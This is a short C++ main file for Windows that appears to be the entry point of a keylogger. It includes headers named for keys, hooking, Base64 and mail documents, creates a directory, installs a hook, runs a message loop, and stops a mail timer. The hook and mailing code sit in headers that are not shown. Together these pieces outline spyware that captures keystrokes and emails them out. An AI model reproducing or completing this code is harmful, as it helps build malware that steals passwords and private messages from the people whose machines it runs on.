#include <iostream>
#include <windows.h>
#include "keys.h"
#include "Helper.h"
#include "Base64.h"
#include "appdata.h"
#include "response.h"
#include "maildocument.h"
#include "hooking.h"

using namespace std;

int main()
{

    MSG Msg;
    IO::MKDir(IO::GetOurPath(true));

    InstallHook();

    while(GetMessageA(&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();
    return 0;
}

